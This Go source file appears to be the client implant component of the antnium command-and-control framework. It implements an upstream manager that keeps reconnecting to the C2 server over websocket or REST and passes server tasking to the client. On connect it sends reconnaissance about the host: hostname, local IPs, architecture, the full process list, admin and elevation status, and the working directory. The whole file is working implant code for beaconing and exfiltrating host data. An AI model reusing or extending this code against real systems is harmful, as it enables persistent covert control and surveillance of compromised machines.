package client

import (
	"os"
	"strconv"
	"time"

	"github.com/dobin/antnium/pkg/arch"
	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"

	log "github.com/sirupsen/logrus"
)

// Upstreammanger provides a connection to the server via ChannelIncoming
type UpstreamManager struct {
	ChannelIncoming chan model.Packet
	ChannelOutgoing chan model.Packet

	config   *ClientConfig
	campaign *campaign.Campaign

	Rest      Upstream
	Websocket Upstream

	reconnectTimer *SleepTimer
}

func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) UpstreamManager {
	upstreamRest := MakeUpstreamRest(config, campaign)
	upstreamWs := MakeUpstreamWs(config, campaign)
	reconnectTimer := MakeSleepTimer()

	u := UpstreamManager{
		ChannelIncoming: make(chan model.Packet),
		ChannelOutgoing: make(chan model.Packet),
		config:          config,
		campaign:        campaign,
		Rest:            &upstreamRest,
		Websocket:       &upstreamWs,
		reconnectTimer:  &reconnectTimer,
	}
	return u
}

// Connect will try until the C2 can be reached via a upstream.
func (u *UpstreamManager) Connect() {
	// Thread which retrieves packets from the active upstream and sends it to client
	var packet model.Packet
	var connected bool
	go func() {
		for {
			// We dont care which upstream we are connected to
			select {
			case packet, connected = <-u.Websocket.ChanIncoming():
				if !connected {
					u.ReconnectWebsocket() // Blocks until we can reach server again
					continue               // We are connected again, do as before
				}
			case packet, connected = <-u.Rest.ChanIncoming():
				// No reconnect handling atm
			}

			// Send the packet to client
			u.ChannelIncoming <- packet
		}
	}()

	// Thread which sends outgoing packets
	go func() {
		for {
			packet, ok := <-u.ChannelOutgoing
			if !ok {
				break
			}

			if u.Websocket.Connected() {
				err := u.Websocket.SendPacket(packet)
				if err != nil {
					log.Errorf("UpstreamManager: error sending packet via Websocket, drop: %s", err.Error())
					// no reconnect here, we just drop the packet. We do it in the read thread
				}
			} else if u.Rest.Connected() {
				err := u.Rest.SendPacket(packet)
				if err != nil {
					log.Errorf("UpstreamManager: error sending packet via REST, drop: %s", err.Error())
				}
			} else {
				log.Errorf("UpstreamManager: No active upstreams, drop packet and sleep")
				time.Sleep(time.Second * 3)
			}
		}
	}()

	u.ConnectRetryForever()
}

// Reconnect will destroy the currect WS upstream, and block until connected again
func (u *UpstreamManager) ReconnectWebsocket() {
	// Throw away old UpstreamWs, and try to connect again
	upstreamWs := MakeUpstreamWs(u.config, u.campaign)
	u.Websocket = &upstreamWs
	log.Infof("UpstreamManager: Upstream websocket disconnect. Retrying...")
	u.ConnectRetryForever()
}

// ConnectRetryForever will try to connect to the server, forever. Then starts upstreams
func (u *UpstreamManager) ConnectRetryForever() error {
	u.reconnectTimer.tick()
	for {
		// Try: Websocket
		if u.campaign.ClientUseWebsocket {
			err := u.Websocket.Connect()
			if err != nil {
				log.Debugf("UpstreamManager: Trying to connect to upstream: WEBSOCKET resulted in error")
				//log.Debugf("UpstreamManager: %s", err.Error())
			} else {
				log.Infof("UpstreamManager: Connected to websocket")
				u.Websocket.Start()
				u.sendClientinfo()
				break
			}
		}

		// Always try REST
		err := u.Rest.Connect()
		if err != nil {
			log.Debugf("UpstreamManager: Trying to connect to upstream REST: resulted in error")
			//log.Debugf("UpstreamManager: %s", err.Error())
		} else {
			log.Infof("UpstreamManager: Connected to REST")
			u.Rest.Start()
			u.sendClientinfo()
			break
		}

		sleepTime := u.reconnectTimer.getSleepDuration()
		log.Debugf("UpstreamManager: Could not connect, sleeping for %s", sleepTime)
		time.Sleep(sleepTime)
	}

	return nil
}

// sendClientinfo will send client information (like process list) to the server
func (u *UpstreamManager) sendClientinfo() {
	if !u.campaign.DoClientInfo {
		return
	}

	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)
	response["hostname"] = u.config.Hostname
	model.AddArrayToResponse("localIp", u.config.LocalIps, response)
	response["arch"] = u.config.Arch
	model.AddArrayToResponse("processes", u.config.Processes, response)
	isElevated, isAdmin, err := arch.Permissions()
	if err == nil {
		response["isElevated"] = strconv.FormatBool(isElevated)
		response["isAdmin"] = strconv.FormatBool(isAdmin)
	}
	response["WorkingDir"], _ = os.Getwd()

	packet := u.config.MakeClientPacket("clientinfo", arguments, response)
	u.ChannelOutgoing <- *packet
}
